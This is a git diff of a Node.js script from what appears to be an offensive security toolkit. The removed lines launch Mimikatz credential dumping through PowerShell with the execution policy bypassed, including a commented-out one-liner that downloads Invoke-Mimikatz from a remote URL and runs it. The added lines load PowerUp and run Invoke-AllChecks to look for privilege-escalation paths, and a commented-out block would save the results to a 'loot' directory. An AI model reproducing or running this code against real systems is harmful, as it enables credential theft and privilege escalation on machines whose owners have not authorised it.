@@ -1,16 +1,26 @@
-const os = require('os')
-const cmd=require('node-cmd');
- 
-    cmd.get(
-        // `Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz`,
-        `Powershell.exe Import-Module ./MimiDogz.ps1; Invoke-Mimidogz`,
-        function(err, data, stderr){
-            if(err||stderr){
-                console.log(err);
-                console.log(stderr);
-            }
-            console.log(data);
-        }
-    );
- 
+const powershell = require('node-powershell');
+const fs = require('fs');
+const os = require('os');
 
+let ps = new powershell({
+    executionPolicy: 'Bypass',
+    noProfile: true
+});
+// ps.on('end', code => {console.log("Shell closed")});
+
+ps.addCommand('. ./pentest/powershell/powerup.ps1');
+ps.addCommand('Invoke-AllChecks');
+ps.invoke().then(output => {
+    console.log(output);
+    // fs.writeFile(`${LootDir}\\PrivEsc.txt`, output,function(err){
+    //     if(err){
+    //         console.log(err);
+    //     } else {
+    //         console.log(`\nWrote PrivEsc Results to ${LootDir}\\PrivEsc.txt`);
+    //     }
+    // });
+    ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
+}).catch(err => {
+    console.log(err);
+    ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
+})
